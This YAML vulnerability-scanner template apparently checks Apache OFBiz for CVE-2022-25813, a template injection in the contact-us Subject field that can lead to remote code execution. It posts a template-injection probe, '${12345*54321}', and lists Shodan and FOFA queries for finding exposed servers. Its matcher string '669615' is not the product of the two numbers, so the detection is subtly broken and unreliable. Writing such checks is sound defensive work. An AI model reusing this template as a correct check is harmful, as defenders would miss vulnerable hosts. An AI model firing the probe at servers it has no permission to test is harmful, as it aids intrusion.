id: CVE-2022-25813

info:
  name: Apache OFBiz SSTI via Contact Us Subject Field
  author: ProjectDiscoveryAI
  severity: high
  description: In Apache OFBiz, versions 18.12.05 and earlier, an attacker can exploit SSTI in the "Subject" field of the contact us page leading to RCE.
  impact: |
    Successful exploitation could lead to remote code execution (RCE) on the server.
  remediation: |
    Apply the official patch provided by Apache OFBiz to mitigate the Server-Side Template Injection vulnerability.
  reference:
    - https://github.com/karimhabush/cyberowl
    - https://github.com/mbadanoiu/CVE-2022-25813
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-25813
    cwe-id: CWE-1336,CWE-94
    epss-score: 0.0024
    epss-percentile: 0.62755
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: ofbiz
    shodan-query: html:"OFBiz"
    fofa-query: app="Apache_OFBiz"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ecommerce/control/contactus"

    body: "subject=${12345*54321}"

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "669615"
        part: body
